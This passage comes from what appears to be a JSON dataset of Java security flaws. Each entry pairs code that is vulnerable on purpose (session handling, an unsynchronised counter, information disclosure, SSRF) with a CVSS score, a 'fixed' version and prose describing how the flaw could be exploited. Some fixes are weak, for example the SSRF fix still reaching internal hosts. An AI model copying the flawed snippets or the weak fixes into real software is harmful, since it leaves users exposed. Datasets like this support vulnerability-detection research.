        "fixed_code": "public String fixateSession(HttpServletRequest request, HttpServletResponse response) {\n    HttpSession session = request.getSession(true);\n    session.invalidate();\n    session = request.getSession(true);\n    Cookie sessionCookie = new Cookie(\"JSESSIONID\", session.getId());\n    sessionCookie.setPath(\"\");\n    sessionCookie.setHttpOnly(true);\n    sessionCookie.setSecure(true);\n    response.addCookie(sessionCookie);\n    return \"Session fixed\";\n}",
        "exploit_ways": [
            "An attacker could set a specific JSESSIONID cookie to hijack the user's session.",
            "By setting a predictable JSESSIONID, an attacker can guess and use it for unauthorized access if the server reuses IDs.",
            "If not set as HttpOnly and Secure, the cookie can be accessed via XSS or transferred over unencrypted connections."
        ]
    },
    "java_46": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "public class Example {\\n    private static int counter = 0;\\n\\n    public void increment() {\\n        int temp = counter;\\n        temp++;\\n        counter = temp;\\n    }\\n}",
        "cvss_score": 3.5,
        "fixed_code": "public class Example {\\n    private static volatile int counter = 0;\\n    private static final Object lock = new Object();\\n\\n    public void increment() {\\n        synchronized (lock) {\\n            int temp = counter;\\n            temp++;\\n            counter = temp;\\n        }\\n    }\\n}",
        "exploit_ways": [
            "Multiple threads can cause the counter to have an incorrect value due to unsynchronized access.",
            "An attacker could create a large number of threads to manipulate the counter's state unpredictably.",
            "Race conditions may lead to inconsistent data states, causing application logic failures."
        ]
    },
    "java_47": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "public class UserInfo {\n    private String sensitiveData = \"Confidential Info\";\n\n    public void displayInfo(String role) {\n        if (role.equals(\"admin\")) {\n            System.out.println(sensitiveData);\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "public class UserInfo {\n    private String sensitiveData = \"Confidential Info\";\n\n    public void displayInfo(String role) {\n        if (isAdmin(role)) {\n            System.out.println(sensitiveData);\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    private boolean isAdmin(String role) {\n        return \"admin\".equals(role);\n    }\n}",
        "exploit_ways": [
            "An attacker with knowledge of the method can call displayInfo(\\\"admin\\\") to access sensitive data.",
            "If user input is not properly sanitized, an attacker could exploit this by passing a crafted string that evaluates to 'admin'.",
            "By observing or intercepting calls to displayInfo, an attacker might learn about the existence and structure of sensitive information."
        ]
    },
    "java_48": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "public class UserInfo {\n    private String username;\n    private String password;\n\n    public UserInfo(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n    }\n}",
        "cvss_score": 2.1,
        "fixed_code": "public class UserInfo {\n    private String username;\n    private String password;\n\n    public UserInfo(String username, String password) {\n        this.username = username;\n        this.password = password;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Username: \" + username);\n        // Password should not be exposed.\n    }\n}",
        "exploit_ways": [
            "An attacker can access the console output to retrieve usernames and passwords.",
            "If this method is called in a logging context, sensitive information could be logged.",
            "Exploitation of other vulnerabilities (e.g., SSRF) may lead to indirect exposure of this data."
        ]
    },
    "java_49": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "public String fetchUrl(String url) throws IOException {\n    URL obj = new URL(url);\n    HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n    String inputLine;\n    StringBuffer response = new StringBuffer();\n\n    while ((inputLine = in.readLine()) != null) {\n        response.append(inputLine);\n    }\n    in.close();\n    return response.toString();\n}",
        "cvss_score": 6.5,
        "fixed_code": "public String fetchUrl(String url) throws IOException, URISyntaxException {\n    URI uri = new URI(url);\n    if (!\"http\".equals(uri.getScheme()) && !\"https\".equals(uri.getScheme())) {\n        throw new IllegalArgumentException(\"Only HTTP/HTTPS URLs are allowed.\");\n    }\n    URL obj = uri.toURL();\n    HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n    String inputLine;\n    StringBuffer response = new StringBuffer();\n\n    while ((inputLine = in.readLine()) != null) {\n        response.append(inputLine);\n    }\n    in.close();\n    return response.toString();\n}",
        "exploit_ways": [
            "An attacker can provide a URL pointing to an internal service to exfiltrate sensitive data.",
            "By providing file:// URLs, the attacker could read local files on the server.",
            "Exploiting misconfigured proxies or services accessible only internally can be attempted."
        ]
    }
}